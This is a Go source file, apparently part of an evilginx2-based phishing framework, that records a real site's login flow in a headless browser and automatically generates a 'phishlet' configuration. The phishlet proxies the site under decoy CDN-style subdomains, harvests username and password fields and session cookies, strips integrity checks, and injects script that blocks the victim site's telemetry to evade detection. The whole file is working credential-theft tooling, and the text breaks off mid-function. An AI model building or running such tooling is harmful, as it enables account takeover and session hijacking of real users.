package core

import (
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"
	"github.com/kgretzky/evilginx2/log"
)

// RecordedRequest holds data captured from a single network request.
type RecordedRequest struct {
	URL        string
	Domain     string
	Path       string
	Method     string
	PostData   string
	Headers    map[string]string
	Timestamp  time.Time
	RequestId  string
	IsRedirect bool
}

// RecordedCookie holds a single cookie observed during the flow.
type RecordedCookie struct {
	Name     string
	Domain   string
	Path     string
	Value    string
	HttpOnly bool
	Secure   bool
}

// DomainStats aggregates request/cookie counts for a single domain.
type DomainStats struct {
	Domain       string
	OrigSub      string
	RootDomain   string
	RequestCount int
	CookieNames  map[string]bool
	IsLanding    bool
	HasPostCreds bool
}

// DetectedCredential represents a credential field found in a POST body.
type DetectedCredential struct {
	Key      string
	FieldType string // "username" or "password"
	PostURL  string
	PostPath string
}

// AnalyzerSession manages a single login-flow recording session.
type AnalyzerSession struct {
	Id         int
	TargetURL  string
	StartTime  time.Time
	Status     string // "recording", "analyzing", "done", "error"

	requests   []RecordedRequest
	cookies    []RecordedCookie
	creds      []DetectedCredential
	domains    map[string]*DomainStats

	ctx         context.Context
	cancel      context.CancelFunc
	allocCtx    context.Context
	allocCancel context.CancelFunc

	mu       sync.Mutex
	puppetId int // associated puppet instance for UI control

	// Screenshot support (reuses puppet infrastructure)
	screenCh  chan []byte
	stopCh    chan struct{}
	viewportW int
	viewportH int
	lastScreen []byte
}

// Known tracking/noise domains to filter out
var noiseDomains = map[string]bool{
	// Google
	"www.google-analytics.com": true, "analytics.google.com": true,
	"www.googletagmanager.com": true, "googletagmanager.com": true,
	"fonts.googleapis.com": true, "fonts.gstatic.com": true,
	"www.gstatic.com": true, "ssl.gstatic.com": true,
	"consent.google.com": true, "play.google.com": true,
	"apis.google.com": true,
	// Facebook
	"www.facebook.com": true, "connect.facebook.net": true, "pixel.facebook.com": true,
	// Bing / Clarity
	"bat.bing.com": true, "c.bing.com": true, "clarity.ms": true, "www.clarity.ms": true,
	// Microsoft telemetry / CDN / non-auth services
	"dc.services.visualstudio.com": true,
	"browser.events.data.msn.com": true, "ntp.msn.com": true,
	"browser.events.data.microsoft.com": true, "browser.pipe.aria.microsoft.com": true,
	"res.public.onecdn.static.microsoft": true,
	"res.cdn.office.net": true, "res-1.cdn.office.net": true, "res-2.cdn.office.net": true,
	"content.lifecycle.office.net": true, "clients.config.office.net": true,
	"ecs.office.com": true, "config.edge.skype.com": true,
	"arc.msn.com": true, "fd.api.iris.microsoft.com": true,
	"titles.prod.mos.microsoft.com": true, "go.trouter.teams.microsoft.com": true,
	"loki.delve.office.com": true, "dakg4cmpuclai.cloudfront.net": true,
	"nam12.safelinks.protection.outlook.com": true, "safelinks.protection.outlook.com": true,
	"static2.sharepointonline.com": true,
}

// Noise domain suffix patterns — any domain ending in these is filtered
var noiseDomainSuffixes = []string{
	".events.data.microsoft.com",
	".pipe.aria.microsoft.com",
	".onecdn.static.microsoft",
	".cdn.office.net",
	".lifecycle.office.net",
	".config.office.net",
	".safelinks.protection.outlook.com",
	".trouter.teams.microsoft.com",
	".prod.mos.microsoft.com",
}

// Known tracking cookie prefixes to filter out
var noiseCookiePrefixes = []string{
	"_ga", "_gid", "_gat", "_fbp", "_fbc", "__utm",
	"_hjid", "_hjAbsolute", "_clck", "_clsk",
	"NID", "IDE", "DSID", "FLC", "AID", "TAID",
}

// Common username field names
var usernameFields = map[string]bool{
	"login": true, "loginfmt": true, "email": true, "username": true,
	"user": true, "identifier": true, "userid": true, "user_id": true,
	"account": true, "emailAddress": true, "mail": true, "loginEmail": true,
	"UserName": true, "userEmail": true, "j_username": true, "session[username_or_email]": true,
}

// Common password field names
var passwordFields = map[string]bool{
	"passwd": true, "password": true, "pass": true, "credential": true,
	"secret": true, "user_password": true, "loginpassword": true,
	"j_password": true, "session[password]": true, "pwd": true,
	"passwrd": true, "user_pass": true,
}

// CDN-style prefixes for generating phish_sub names
var cdnPrefixes = []string{
	"cdn", "edge", "static", "res", "assets", "node", "lb", "svc", "app", "cache", "gw", "api", "fe", "dl",
}

// Analyzer manages analyzer sessions within the PuppetManager context.
type Analyzer struct {
	sessions map[int]*AnalyzerSession
	nextId   int
	mu       sync.RWMutex
	pm       *PuppetManager
}

func NewAnalyzer(pm *PuppetManager) *Analyzer {
	return &Analyzer{
		sessions: make(map[int]*AnalyzerSession),
		nextId:   1,
		pm:       pm,
	}
}

// StartAnalysis launches a headless browser, navigates to the target URL,
// and begins recording all network traffic. Returns an AnalyzerSession
// that is also registered as a puppet for remote control via the web UI.
func (a *Analyzer) StartAnalysis(targetURL string) (*AnalyzerSession, error) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	a.mu.Lock()
	id := a.nextId
	a.nextId++
	a.mu.Unlock()

	sess := &AnalyzerSession{
		Id:        id,
		TargetURL: targetURL,
		StartTime: time.Now(),
		Status:    "recording",
		requests:  []RecordedRequest{},
		cookies:   []RecordedCookie{},
		creds:     []DetectedCredential{},
		domains:   make(map[string]*DomainStats),
		screenCh:  make(chan []byte, 5),
		stopCh:    make(chan struct{}),
		viewportW: 1920,
		viewportH: 1080,
	}

	a.mu.Lock()
	a.sessions[id] = sess
	a.mu.Unlock()

	go a.runRecording(sess)

	return sess, nil
}

func (a *Analyzer) runRecording(sess *AnalyzerSession) {
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-web-security", false),
		chromedp.Flag("disable-features", "VizDisplayCompositor"),
		chromedp.WindowSize(sess.viewportW, sess.viewportH),
		chromedp.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
	)

	if a.pm.chromePath != "" {
		opts = append(opts, chromedp.ExecPath(a.pm.chromePath))
	}

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	sess.allocCtx = allocCtx
	sess.allocCancel = allocCancel

	ctx, cancel := chromedp.NewContext(allocCtx)
	sess.ctx = ctx
	sess.cancel = cancel

	// Enable network tracking and attach event listeners
	if err := chromedp.Run(ctx, network.Enable()); err != nil {
		sess.mu.Lock()
		sess.Status = "error"
		sess.mu.Unlock()
		log.Error("analyzer [%d]: failed to enable network tracking: %v", sess.Id, err)
		return
	}

	// Listen for network requests
	chromedp.ListenTarget(ctx, func(ev interface{}) {
		switch e := ev.(type) {
		case *network.EventRequestWillBeSent:
			a.handleRequest(sess, e)
		case *network.EventResponseReceived:
			a.handleResponse(sess, e)
		case *page.EventJavascriptDialogOpening:
			go chromedp.Run(ctx, page.HandleJavaScriptDialog(true))
		}
	})

	// Navigate to the target URL
	log.Info("analyzer [%d]: navigating to %s", sess.Id, sess.TargetURL)
	if err := chromedp.Run(ctx, chromedp.Navigate(sess.TargetURL)); err != nil {
		sess.mu.Lock()
		sess.Status = "error"
		sess.mu.Unlock()
		log.Error("analyzer [%d]: failed to navigate: %v", sess.Id, err)
		return
	}

	time.Sleep(2 * time.Second)

	log.Success("analyzer [%d]: recording started — interact via the puppet control panel", sess.Id)

	// Register as a puppet instance so the web UI can control it
	a.registerAsPuppet(sess)

	// Start screenshot loop for the puppet UI
	go a.screenshotLoop(sess)

	// Wait for stop signal
	<-sess.stopCh

	// Capture final cookie snapshot
	a.captureFinalCookies(sess)

	sess.mu.Lock()
	sess.Status = "analyzing"
	sess.mu.Unlock()

	cancel()
	allocCancel()
	log.Info("analyzer [%d]: recording stopped", sess.Id)
}

func (a *Analyzer) handleRequest(sess *AnalyzerSession, e *network.EventRequestWillBeSent) {
	reqURL := e.Request.URL
	parsedURL, err := url.Parse(reqURL)
	if err != nil {
		return
	}

	domain := parsedURL.Hostname()
	if domain == "" {
		return
	}

	// Extract post data from PostDataEntries
	postData := ""
	if e.Request.HasPostData && len(e.Request.PostDataEntries) > 0 {
		var parts []string
		for _, entry := range e.Request.PostDataEntries {
			if entry.Bytes != "" {
				parts = append(parts, entry.Bytes)
			}
		}
		postData = strings.Join(parts, "")
	}

	// If PostDataEntries were empty but HasPostData is set, try fetching via CDP
	if e.Request.HasPostData && postData == "" {
		go func() {
			fetchedData, fetchErr := network.GetRequestPostData(e.RequestID).Do(sess.ctx)
			if fetchErr == nil && fetchedData != "" {
				sess.mu.Lock()
				a.detectCredentials(sess, fetchedData, reqURL, parsedURL.Path)
				sess.mu.Unlock()
			}
		}()
	}

	rec := RecordedRequest{
		URL:       reqURL,
		Domain:    domain,
		Path:      parsedURL.Path,
		Method:    e.Request.Method,
		PostData:  postData,
		Timestamp: time.Now(),
		RequestId: string(e.RequestID),
		Headers:   make(map[string]string),
	}

	if e.RedirectHasExtraInfo {
		rec.IsRedirect = true
	}

	// Extract headers
	for k, v := range e.Request.Headers {
		if s, ok := v.(string); ok {
			rec.Headers[k] = s
		}
	}

	sess.mu.Lock()
	sess.requests = append(sess.requests, rec)

	// Update domain stats
	ds, ok := sess.domains[domain]
	if !ok {
		origSub, rootDomain := splitDomain(domain)
		ds = &DomainStats{
			Domain:      domain,
			OrigSub:     origSub,
			RootDomain:  rootDomain,
			CookieNames: make(map[string]bool),
		}
		sess.domains[domain] = ds
	}
	ds.RequestCount++

	// Check POST data for credential fields
	if e.Request.Method == "POST" && postData != "" {
		a.detectCredentials(sess, postData, reqURL, parsedURL.Path)
	}
	sess.mu.Unlock()
}

func (a *Analyzer) handleResponse(sess *AnalyzerSession, e *network.EventResponseReceived) {
	// Extract Set-Cookie headers from response
	headers := e.Response.Headers
	for k, v := range headers {
		if strings.ToLower(k) == "set-cookie" {
			if cookieStr, ok := v.(string); ok {
				a.parseCookieHeader(sess, cookieStr, e.Response.URL)
			}
		}
	}
}

func (a *Analyzer) parseCookieHeader(sess *AnalyzerSession, cookieStr string, responseURL string) {
	parsedURL, _ := url.Parse(responseURL)
	domain := ""
	if parsedURL != nil {
		domain = parsedURL.Hostname()
	}

	// Each Set-Cookie header may contain one cookie
	parts := strings.Split(cookieStr, ";")
	if len(parts) == 0 {
		return
	}

	nameVal := strings.SplitN(strings.TrimSpace(parts[0]), "=", 2)
	if len(nameVal) < 2 {
		return
	}

	ck := RecordedCookie{
		Name:   nameVal[0],
		Value:  nameVal[1],
		Domain: domain,
		Path:   "/",
	}

	for _, attr := range parts[1:] {
		attr = strings.TrimSpace(attr)
		kv := strings.SplitN(attr, "=", 2)
		key := strings.ToLower(kv[0])
		val := ""
		if len(kv) == 2 {
			val = kv[1]
		}
		switch key {
		case "domain":
			ck.Domain = val
		case "path":
			ck.Path = val
		case "httponly":
			ck.HttpOnly = true
		case "secure":
			ck.Secure = true
		}
	}

	sess.mu.Lock()
	sess.cookies = append(sess.cookies, ck)

	// Update domain stats with cookie name
	cookieDomain := ck.Domain
	if strings.HasPrefix(cookieDomain, ".") {
		cookieDomain = cookieDomain[1:]
	}
	if ds, ok := sess.domains[cookieDomain]; ok {
		ds.CookieNames[ck.Name] = true
	} else {
		// Cookie domain might differ from request domain; track it
		for _, ds := range sess.domains {
			if strings.HasSuffix(ds.Domain, cookieDomain) || strings.HasSuffix(cookieDomain, ds.Domain) {
				ds.CookieNames[ck.Name] = true
				break
			}
		}
	}
	sess.mu.Unlock()
}

func (a *Analyzer) detectCredentials(sess *AnalyzerSession, postData string, postURL string, postPath string) {
	trimmed := strings.TrimSpace(postData)

	// Try JSON first (Microsoft, Google, and many modern sites use JSON POST bodies)
	if strings.HasPrefix(trimmed, "{") {
		a.detectCredentialsJSON(sess, trimmed, postURL, postPath)
		return
	}

	// Fall back to URL-encoded form data
	values, err := url.ParseQuery(postData)
	if err != nil {
		return
	}

	a.checkFieldNames(sess, values, postURL, postPath)
}

func (a *Analyzer) detectCredentialsJSON(sess *AnalyzerSession, jsonData string, postURL string, postPath string) {
	// Parse top-level JSON object and check all string keys
	var obj map[string]interface{}
	if err := json.Unmarshal([]byte(jsonData), &obj); err != nil {
		return
	}

	// Flatten nested JSON keys into a simple key→value map for checking
	flat := make(url.Values)
	flattenJSON("", obj, flat)

	a.checkFieldNames(sess, flat, postURL, postPath)
}

// flattenJSON recursively flattens a JSON object into url.Values for credential detection.
func flattenJSON(prefix string, obj map[string]interface{}, out url.Values) {
	for k, v := range obj {
		key := k
		if prefix != "" {
			key = prefix + "." + k
		}
		switch val := v.(type) {
		case string:
			out.Set(key, val)
			// Also set the short key (without prefix) for matching
			out.Set(k, val)
		case map[string]interface{}:
			flattenJSON(key, val, out)
		}
	}
}

func (a *Analyzer) checkFieldNames(sess *AnalyzerSession, values url.Values, postURL string, postPath string) {
	for key := range values {
		keyLower := strings.ToLower(key)
		// Also check the last segment of dotted keys (e.g. "credentials.passwd" → "passwd")
		keyParts := strings.Split(keyLower, ".")
		keyShort := keyParts[len(keyParts)-1]

		if usernameFields[key] || usernameFields[keyLower] || usernameFields[keyShort] {
			sess.creds = append(sess.creds, DetectedCredential{
				Key:       key,
				FieldType: "username",
				PostURL:   postURL,
				PostPath:  postPath,
			})
			log.Info("analyzer [%d]: detected username field: %s (POST %s)", sess.Id, key, postPath)
		}
		if passwordFields[key] || passwordFields[keyLower] || passwordFields[keyShort] {
			sess.creds = append(sess.creds, DetectedCredential{
				Key:       key,
				FieldType: "password",
				PostURL:   postURL,
				PostPath:  postPath,
			})
			log.Info("analyzer [%d]: detected password field: %s (POST %s)", sess.Id, key, postPath)
		}
	}
}

func (a *Analyzer) captureFinalCookies(sess *AnalyzerSession) {
	sess.mu.Lock()
	status := sess.Status
	sess.mu.Unlock()

	if status == "error" {
		return
	}

	var cookies []*network.Cookie
	err := chromedp.Run(sess.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
		var err error
		cookies, err = network.GetCookies().Do(ctx)
		return err
	}))
	if err != nil {
		log.Warning("analyzer [%d]: could not capture final cookies: %v", sess.Id, err)
		return
	}

	sess.mu.Lock()
	for _, ck := range cookies {
		sess.cookies = append(sess.cookies, RecordedCookie{
			Name:     ck.Name,
			Domain:   ck.Domain,
			Path:     ck.Path,
			Value:    ck.Value,
			HttpOnly: ck.HTTPOnly,
			Secure:   ck.Secure,
		})

		// Update domain stats
		cookieDomain := ck.Domain
		if strings.HasPrefix(cookieDomain, ".") {
			cookieDomain = cookieDomain[1:]
		}
		for _, ds := range sess.domains {
			if ds.Domain == cookieDomain || strings.HasSuffix(ds.Domain, cookieDomain) || strings.HasSuffix(cookieDomain, ds.Domain) {
				ds.CookieNames[ck.Name] = true
			}
		}
	}
	sess.mu.Unlock()

	log.Info("analyzer [%d]: captured %d cookies from final snapshot", sess.Id, len(cookies))
}

func (a *Analyzer) screenshotLoop(sess *AnalyzerSession) {
	ticker := time.NewTicker(500 * time.Millisecond) // ~2fps — lighter on the server during recording
	defer ticker.Stop()

	for {
		select {
		case <-sess.stopCh:
			return
		case <-ticker.C:
			sess.mu.Lock()
			status := sess.Status
			sess.mu.Unlock()

			if status != "recording" {
				continue
			}

			// Use a timeout context so a slow screenshot doesn't block everything
			screenshotCtx, screenshotCancel := context.WithTimeout(sess.ctx, 3*time.Second)
			var buf []byte
			err := chromedp.Run(screenshotCtx, chromedp.ActionFunc(func(ctx context.Context) error {
				var err error
				buf, err = page.CaptureScreenshot().
					WithFormat(page.CaptureScreenshotFormatJpeg).
					WithQuality(40).
					Do(ctx)
				return err
			}))
			screenshotCancel()
			if err != nil {
				continue
			}

			sess.mu.Lock()
			sess.lastScreen = buf
			sess.mu.Unlock()

			// Drain any stale frame before sending new one
			select {
			case <-sess.screenCh:
			default:
			}
			select {
			case sess.screenCh <- buf:
			default:
			}
		}
	}
}

// registerAsPuppet creates a puppet instance wrapper so the analyzer session
// can be controlled through the existing puppet web UI.
func (a *Analyzer) registerAsPuppet(sess *AnalyzerSession) {
	puppet := &PuppetInstance{
		Id:         sess.Id + 10000, // Offset to avoid ID collisions with regular puppets
		SessionId:  0,
		Phishlet:   "analyzer",
		Username:   "login-flow-recording",
		TargetURL:  sess.TargetURL,
		Status:     PUPPET_RUNNING,
		CreateTime: sess.StartTime,
		ctx:        sess.ctx,
		cancel:     sess.cancel,
		allocCtx:   sess.allocCtx,
		allocCancel: sess.allocCancel,
		screenCh:   sess.screenCh,
		stopCh:     sess.stopCh,
		viewportW:  sess.viewportW,
		viewportH:  sess.viewportH,
		lastScreen: nil,
	}

	sess.puppetId = puppet.Id

	a.pm.mu.Lock()
	a.pm.instances[puppet.Id] = puppet
	a.pm.mu.Unlock()

	controlURL := a.pm.GetControlURL(puppet.Id)
	log.Info("analyzer [%d]: control URL: %s", sess.Id, controlURL)
}

// StopAnalysis stops the recording and returns the session for analysis.
func (a *Analyzer) StopAnalysis(id int) (*AnalyzerSession, error) {
	a.mu.RLock()
	sess, ok := a.sessions[id]
	a.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("analyzer session %d not found", id)
	}

	select {
	case <-sess.stopCh:
		// Already closed
	default:
		close(sess.stopCh)
	}

	// Wait a moment for final cookie capture
	time.Sleep(1 * time.Second)

	// Clean up puppet registration
	a.pm.mu.Lock()
	delete(a.pm.instances, sess.puppetId)
	a.pm.mu.Unlock()

	return sess, nil
}

// GetSession returns an analyzer session by ID.
func (a *Analyzer) GetSession(id int) (*AnalyzerSession, bool) {
	a.mu.RLock()
	defer a.mu.RUnlock()
	s, ok := a.sessions[id]
	return s, ok
}

// GetActiveSessions returns all active analyzer sessions.
func (a *Analyzer) GetActiveSessions() []*AnalyzerSession {
	a.mu.RLock()
	defer a.mu.RUnlock()
	var list []*AnalyzerSession
	for _, s := range a.sessions {
		list = append(list, s)
	}
	return list
}

// ──────────────────────────────────────────────────────────────────────
// Analysis and YAML generation
// ──────────────────────────────────────────────────────────────────────

// AnalysisResult holds the processed output ready for YAML generation.
type AnalysisResult struct {
	ProxyHosts  []AnalyzedProxyHost
	AuthTokens  []AnalyzedAuthToken
	Credentials []AnalyzedCredential
	LoginDomain string
	LoginPath   string
	LandingDomain string
	SubFilters  []AnalyzedSubFilter
}

type AnalyzedProxyHost struct {
	PhishSub  string
	OrigSub   string
	Domain    string
	Session   bool
	IsLanding bool
}

type AnalyzedAuthToken struct {
	Domain string
	Keys   []string
}

type AnalyzedCredential struct {
	Name      string
	Key       string
	Search    string
	FieldType string
}

type AnalyzedSubFilter struct {
	TriggersOn string
	OrigSub    string
	Domain     string
	Search     string
	Replace    string
	Mimes      string
}

// Analyze processes the recorded session data and returns a structured result.
func (a *Analyzer) Analyze(sess *AnalyzerSession) *AnalysisResult {
	sess.mu.Lock()
	defer sess.mu.Unlock()

	result := &AnalysisResult{}

	// Determine the landing domain from the target URL
	parsedTarget, _ := url.Parse(sess.TargetURL)
	landingDomain := ""
	if parsedTarget != nil {
		landingDomain = parsedTarget.Hostname()
	}
	result.LandingDomain = landingDomain

	// Filter domains: remove noise, sort by request count
	var relevantDomains []*DomainStats
	for _, ds := range sess.domains {
		if isNoiseDomain(ds.Domain) {
			continue
		}
		if ds.RequestCount < 3 {
			continue
		}
		relevantDomains = append(relevantDomains, ds)
	}

	sort.Slice(relevantDomains, func(i, j int) bool {
		return relevantDomains[i].RequestCount > relevantDomains[j].RequestCount
	})

	// Cap at 6 most relevant domains to keep phishlet focused
	if len(relevantDomains) > 6 {
		relevantDomains = relevantDomains[:6]
	}

	// Always include the landing domain even if it was below threshold
	landingIncluded := false
	for _, ds := range relevantDomains {
		if ds.Domain == landingDomain {
			landingIncluded = true
			break
		}
	}
	if !landingIncluded && landingDomain != "" {
		if ds, ok := sess.domains[landingDomain]; ok {
			relevantDomains = append([]*DomainStats{ds}, relevantDomains...)
		}
	}

	// Generate proxy_hosts with CDN-style phish_sub names
	usedPrefixes := make(map[string]bool)
	for _, ds := range relevantDomains {
		isLanding := ds.Domain == landingDomain
		hasCookies := len(ds.CookieNames) > 0

		phishSub := generatePhishSub(usedPrefixes)
		origSub, rootDomain := splitDomain(ds.Domain)

		result.ProxyHosts = append(result.ProxyHosts, AnalyzedProxyHost{
			PhishSub:  phishSub,
			OrigSub:   origSub,
			Domain:    rootDomain,
			Session:   hasCookies,
			IsLanding: isLanding,
		})

		// Sub-filters for landing domain
		if isLanding {
			result.SubFilters = append(result.SubFilters, AnalyzedSubFilter{
				TriggersOn: ds.Domain,
				OrigSub:    origSub,
				Domain:     rootDomain,
				Search:     "integrity=",
				Replace:    "data-noop=",
				Mimes:      "text/html",
			})
			result.SubFilters = append(result.SubFilters, AnalyzedSubFilter{
				TriggersOn: ds.Domain,
				OrigSub:    origSub,
				Domain:     rootDomain,
				Search:     "crossorigin=",
				Replace:    "data-noop=",
				Mimes:      "text/html",
			})
		}
	}

	// Build auth_tokens: group cookies by domain, filter noise
	cookiesByDomain := make(map[string]map[string]bool)
	for _, ck := range sess.cookies {
		domain := ck.Domain
		if isNoiseCookie(ck.Name) {
			continue
		}
		if _, ok := cookiesByDomain[domain]; !ok {
			cookiesByDomain[domain] = make(map[string]bool)
		}
		cookiesByDomain[domain][ck.Name] = true
	}

	for domain, names := range cookiesByDomain {
		if len(names) == 0 {
			continue
		}
		// Only include cookies from domains we're proxying
		isProxied := false
		for _, ph := range result.ProxyHosts {
			fullDomain := ph.OrigSub + "." + ph.Domain
			cleanDomain := strings.TrimPrefix(domain, ".")
			if cleanDomain == fullDomain || strings.HasSuffix(cleanDomain, "."+ph.Domain) || cleanDomain == ph.Domain {
				isProxied = true
				break
			}
		}
		if !isProxied {
			continue
		}

		var keys []string
		for name := range names {
			keys = append(keys, name)
		}
		sort.Strings(keys)

		result.AuthTokens = append(result.AuthTokens, AnalyzedAuthToken{
			Domain: domain,
			Keys:   keys,
		})
	}

	// Build credentials from detected POST fields
	seenFields := make(map[string]bool)
	for _, cred := range sess.creds {
		if seenFields[cred.Key] {
			continue
		}
		seenFields[cred.Key] = true

		result.Credentials = append(result.Credentials, AnalyzedCredential{
			Name:      cred.FieldType,
			Key:       cred.Key,
			Search:    "(.*)",
			FieldType: "post",
		})

		// Use the POST URL for login domain/path
		if cred.FieldType == "username" || (result.LoginDomain == "" && cred.FieldType == "password") {
			postParsed, _ := url.Parse(cred.PostURL)
			if postParsed != nil {
				result.LoginDomain = postParsed.Hostname()
				result.LoginPath = postParsed.Path
			}
		}
	}

	// Fallback login path
	if result.LoginDomain == "" {
		result.LoginDomain = landingDomain
		if parsedTarget != nil && parsedTarget.Path != "" {
			result.LoginPath = parsedTarget.Path
		} else {
			result.LoginPath = "/"
		}
	}

	sess.Status = "done"
	return result
}

// GenerateYAML produces a phishlet YAML string from the analysis result.
func (a *Analyzer) GenerateYAML(result *AnalysisResult) string {
	var sb strings.Builder

	sb.WriteString("min_ver: '3.0.0'\n\n")

	// proxy_hosts
	sb.WriteString("proxy_hosts:\n")
	for _, ph := range result.ProxyHosts {
		sb.WriteString(fmt.Sprintf("  - {phish_sub: '%s', orig_sub: '%s', domain: '%s', session: %t, is_landing: %t, auto_filter: true}\n",
			ph.PhishSub, ph.OrigSub, ph.Domain, ph.Session, ph.IsLanding))
	}

	// sub_filters
	if len(result.SubFilters) > 0 {
		sb.WriteString("\nsub_filters:\n")
		for _, sf := range result.SubFilters {
			sb.WriteString(fmt.Sprintf("  - {triggers_on: '%s', orig_sub: '%s', domain: '%s', search: '%s', replace: '%s', mimes: ['%s']}\n",
				sf.TriggersOn, sf.OrigSub, sf.Domain, sf.Search, sf.Replace, sf.Mimes))
		}
	}

	// auth_tokens
	if len(result.AuthTokens) > 0 {
		sb.WriteString("\nauth_tokens:\n")
		for _, at := range result.AuthTokens {
			quotedKeys := make([]string, len(at.Keys))
			for i, k := range at.Keys {
				quotedKeys[i] = "'" + k + "'"
			}
			sb.WriteString(fmt.Sprintf("  - domain: '%s'\n    keys: [%s]\n", at.Domain, strings.Join(quotedKeys, ", ")))
		}
	}

	// credentials
	sb.WriteString("\ncredentials:\n")
	hasUsername := false
	hasPassword := false
	for _, cred := range result.Credentials {
		if cred.Name == "username" && !hasUsername {
			sb.WriteString(fmt.Sprintf("  username:\n    key: '%s'\n    search: '%s'\n    type: '%s'\n", cred.Key, cred.Search, cred.FieldType))
			hasUsername = true
		}
		if cred.Name == "password" && !hasPassword {
			sb.WriteString(fmt.Sprintf("  password:\n    key: '%s'\n    search: '%s'\n    type: '%s'\n", cred.Key, cred.Search, cred.FieldType))
			hasPassword = true
		}
	}
	if !hasUsername {
		sb.WriteString("  username:\n    key: ''\n    search: '(.*)'\n    type: 'post'\n")
	}
	if !hasPassword {
		sb.WriteString("  password:\n    key: ''\n    search: '(.*)'\n    type: 'post'\n")
	}

	// login
	sb.WriteString(fmt.Sprintf("\nlogin:\n  domain: '%s'\n  path: '%s'\n", result.LoginDomain, result.LoginPath))

	// js_inject — generate telemetry blocker for landing domain
	if result.LandingDomain != "" {
		sb.WriteString(fmt.Sprintf(`
js_inject:
  - trigger_domains: ['%s']
    trigger_paths: ['/.*']
    script: |
      <script>
      (function(){
        var oFetch = window.fetch;
        window.fetch = function(){
          var u = arguments[0];
          if(typeof u === 'string' && (u.indexOf('telemetry') !== -1 || u.indexOf('logger') !== -1 || u.indexOf('OneCollector') !== -1))
            return Promise.resolve(new Response('',{status:200}));
          return oFetch.apply(this, arguments);
        };
        var oBeacon = navigator.sendBeacon;
        if(oBeacon) navigator.sendBeacon = function(u){
          if(u && (u.indexOf('telemetry') !== -1 || u.indexOf('browser.events') !== -1))
            return true;
          return oBeacon.apply(navigator, arguments);
        };
        var oOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(m, u){
          if(u && (u.indexOf('telemetry') !== -1 || u.indexOf('logger') !== -1))
            this._blocked = true;
          return oOpen.apply(this, arguments);
        };
        var oSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(){
          if(this._blocked) return;
          return oSend.apply(this, arguments);
        };
      })();
      </script>
`, result.LandingDomain))
	}

	return sb.String()
}

// GetStatusSummary returns a human-readable status string for the analyzer session.
func (a *Analyzer) GetStatusSummary(sess *AnalyzerSession) string {
	sess.mu.Lock()
	defer sess.mu.Unlock()

	var sb strings.Builder
	elapsed := time.Since(sess.StartTime).Round(time.Second)

	sb.WriteString(fmt.Sprintf("Recording login flow for: %s\n", sess.TargetURL))
	sb.WriteString(fmt.Sprintf("Duration: %s\n", elapsed))
	sb.WriteString(fmt.Sprintf("Status: %s\n", sess.Status))
	// Sort domains by request count, filtering noise
	type domainRow struct {
		name     string
		requests int
		cookies  int
		noise    bool
	}
	var rows []domainRow
	relevantCount := 0
	for _, ds := range sess.domains {
		noise := isNoiseDomain(ds.Domain)
		if !noise {
			relevantCount++
		}
		if !noise && ds.RequestCount >= 2 {
			rows = append(rows, domainRow{ds.Domain, ds.RequestCount, len(ds.CookieNames), false})
		}
	}
	sort.Slice(rows, func(i, j int) bool {
		return rows[i].requests > rows[j].requests
	})
	sb.WriteString(fmt.Sprintf("Relevant domains: %d (of %d total, noise filtered)\n", relevantCount, len(sess.domains)))
	for _, r := range rows {
		sb.WriteString(fmt.Sprintf("  %-45s — %d requests, %d cookies\n", r.name, r.requests, r.cookies))
	}

	// Show detected credentials
	if len(sess.creds) > 0 {
		var fieldNames []string
		seen := make(map[string]bool)
		for _, c := range sess.creds {
			if !seen[c.Key] {
				fieldNames = append(fieldNames, c.Key)
				seen[c.Key] = true
			}
		}
		sb.WriteString(fmt.Sprintf("POST fields detected: %s\n", strings.Join(fieldNames, ", ")))
	} else {
		sb.WriteString("POST fields detected: none yet\n")
	}

	// Show control URL
	if sess.puppetId > 0 {
		controlURL := a.pm.GetControlURL(sess.puppetId)
		sb.WriteString(fmt.Sprintf("Control URL: %s\n", controlURL))
	}

	return sb.String()
}

// ──────────────────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────────────────

// splitDomain extracts the subdomain and root domain from a hostname.
// e.g., "login.microsoftonline.com" -> ("login", "microsoftonline.com")
// e.g., "aadcdn.msftauth.net" -> ("aadcdn", "msftauth.net")
func splitDomain(hostname string) (string, string) {
	parts := strings.Split(hostname, ".")
	if len(parts) <= 2 {
		return "", hostname
	}
	// Handle domains like co.uk, com.au etc. (simple heuristic)
	rootParts := 2
	if len(parts) > 2 {
		last := parts[len(parts)-1]
		secondLast := parts[len(parts)-2]
		if len(last) <= 3 && len(secondLast) <= 3 {
			rootParts = 3
		}
	}
	if rootParts >= len(parts) {
		return "", hostname
	}
	sub := strings.Join(parts[:len(parts)-rootParts], ".")
	root := strings.Join(parts[len(parts)-rootParts:], ".")
	return sub, root
}

// generatePhishSub creates a CDN-style subdomain like "cdn-7f3a" or "edge-3b9c".
func generatePhishSub(used map[string]bool) string {
	for attempts := 0; attempts < 50; attempts++ {
		prefix := cdnPrefixes[rand.Intn(len(cdnPrefixes))]
		suffix := fmt.Sprintf("%x", rand.Intn(0xffff))
		if len(suffix) > 4 {
			suffix = suffix[:4]
		}
		name := prefix + "-" + suffix
		if !used[name] {
			used[name] = true
			return name
		}
	}
	// Fallback
	name := fmt.Sprintf("n-%x", rand.Intn(0xffffff))
	used[name] = true
	return name
}

// isNoiseCookie returns true if the cookie name matches known tracking/analytics patterns.
// isNoiseDomain checks if a domain is a known tracking/telemetry/CDN noise domain.
func isNoiseDomain(domain string) bool {
	if noiseDomains[domain] {
		return true
	}
	for _, suffix := range noiseDomainSuffixes {
		if strings.HasSuffix(domain, suffix) {
			return true
		}
	}
	return false
}

func isNoiseCookie(name string) bool {
	nameLower := strings.ToLower(name)
